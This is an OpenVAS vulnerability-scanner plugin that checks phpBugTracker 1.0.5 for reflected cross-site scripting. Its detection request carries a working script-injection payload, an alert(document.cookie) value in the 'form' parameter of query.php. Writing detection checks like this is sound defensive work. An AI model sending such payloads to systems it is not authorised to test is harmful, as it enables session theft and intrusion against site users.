###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phpbugtracker_multiple_xss.nasl 13 2013-10-27 12:16:33Z jan $
#
# phpBugTracker Multiple Reflected Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site.
  Impact Level: Application";
tag_affected = "phpBugTracker version 1.0.5";
tag_insight = "The multiple flaws are due to:
  - Input passed via the 'form' parameter to the 'query.php' script is not
    properly sanitized before being returned to the user.
  - 'newaccount.php' are also vulnerable because they fail to perform filtering
     when using the REQUEST_URI variable.";
tag_solution = "No solution or patch is available as of 18th March, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/phpbt/files/phpbt/";
tag_summary = "This host is running phpBugTracker and is prone to multiple reflected cross-site scripting
  vulnerabilities.";

if(description)
{
  script_id(900275);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-25 15:52:06 +0100 (Fri, 25 Mar 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("phpBugTracker Multiple Reflected Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98572/ZSL-2011-4996.txt");

  script_description(desc);
  script_summary("Check for phpBugTracker Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("phpBugTracker_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
phpPort = get_http_port(default:80);
if(!phpPort){
  exit(0);
}

## Get directory from KB
dir = get_dir_from_kb(port:phpPort, app:"phpBugTracker");
if(!dir){
  exit(0);
}

## Try XSS attack
sndReq = http_get(item:string(dir, "/query.php?op=doquery&form=1>'><script>" +
                       "alert(document.cookie)</script>"), port:phpPort);
rcvRes = http_send_recv(port:phpPort, data:sndReq);

## Confirm the attack
if((">alert(document.cookie)<" >< rcvRes)){
  security_warning(phpPort);
}
